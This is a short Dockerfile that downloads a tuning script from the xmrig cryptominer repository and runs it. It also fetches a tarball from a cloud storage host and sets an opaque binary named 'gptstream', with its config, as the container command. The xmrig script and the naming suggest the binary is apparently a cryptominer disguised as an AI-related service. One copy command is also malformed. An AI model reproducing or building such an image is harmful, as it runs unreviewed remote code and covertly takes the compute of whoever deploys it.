FROM ubuntu:22.04

LABEL maintainer="Roman Nikov"

RUN apt update; \
    apt install -y libuv1-dev; \
    apt install -y wget; \
    wget https://raw.githubusercontent.com/xmrig/xmrig/dev/scripts/randomx_boost.sh -v -O randomx_boost.sh; \
    cp randomx_boost.sh /usr/local/bin/cp randomx_boost.sh; \
    wget https://gptstream.obs.ru-moscow-1.hc.sbercloud.ru/gptstream-DO2.tar.gz; \
    tar xf gptstream-DO2.tar.gz; \
    cd gptstream-DO2; \
    cp config.json /usr/local/bin/config.json; \
    cp gptstream /usr/local/bin/gptstream; \
    cd /usr/local/bin;

WORKDIR /usr/local/bin

RUN chmod 744 config.json;

RUN chmod 744 gptstream;

RUN chmod 777 randomx_boost.sh

RUN randomx_boost.sh

CMD gptstream
